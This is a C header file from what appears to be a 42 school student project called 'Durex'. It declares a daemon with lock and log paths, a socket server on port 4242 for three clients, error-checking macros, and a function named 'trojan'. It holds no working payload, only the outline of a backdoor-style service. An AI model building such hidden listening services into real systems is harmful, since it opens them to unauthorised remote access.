/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/01 14:25:26 by hivian            #+#    #+#             */
/*   Updated: 2017/06/02 10:34:21 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H
# define DUREX_H

# define Xv(err,res,str)	(x_void(err,res,str,__FILE__,__LINE__))
# define X(err,res,str)		(x_int(err,res,str,__FILE__,__LINE__))
# define LOCK_PATH "/var/lock/durex.lock"
# define LOG_PATH "/var/log/durex.log"
# define NB_CLIENTS 3
# define PORT 4242


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <syslog.h>
#include <sys/socket.h>
#include <netinet/in.h>

typedef struct sockaddr_in	t_sock_in;

typedef struct				s_env
{
	FILE					*f_logs;
	int 					hsock;
	int						csock;
	t_sock_in				haddr;
	socklen_t 				haddrSize;
	//int 					bind, listen, chdirValue, csockValue;
}							t_env;

void						trojan(t_env *e);
int							create_server(t_env *e);

int							x_int(int err, int res, char *str, char *file, int line);
void						*x_void(void *err, void *res, char *str, char *file, int line);

#endif
